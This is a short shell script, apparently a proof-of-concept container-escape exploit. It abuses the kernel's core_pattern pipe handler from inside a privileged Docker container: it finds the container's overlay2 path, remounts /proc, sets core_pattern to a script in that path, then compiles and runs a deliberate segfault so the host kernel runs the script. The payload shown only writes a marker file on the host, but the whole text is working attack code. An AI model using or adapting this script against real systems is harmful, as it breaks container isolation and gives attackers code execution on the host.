# Create a escape
cat <<EOF > /escape.sh
#!/bin/sh
echo "Arcane magic!" > /proc/1/root/tmp/hex_crystal
EOF
chmod +x /escape.sh

# Create a crasher
cat <<EOF > crash.c
int main(void) {
    int *p = 0;
    *p = 1;
    return 0;
}
EOF

# Get the container hash
export HASH=$(mount | grep overlay | sed -n 's|.*upperdir=/var/lib/docker/overlay2/\([^/]*\)/diff.*|\1|p')

# Mount proc shared between kernel
mount -t proc none /proc

# Pass script to kernel fallback
echo "|/var/lib/docker/overlay2/$HASH/diff/escape.sh" > /proc/sys/kernel/core_pattern

# Compile and Crash
gcc crash.c -o crash
chmod +x crash
./crash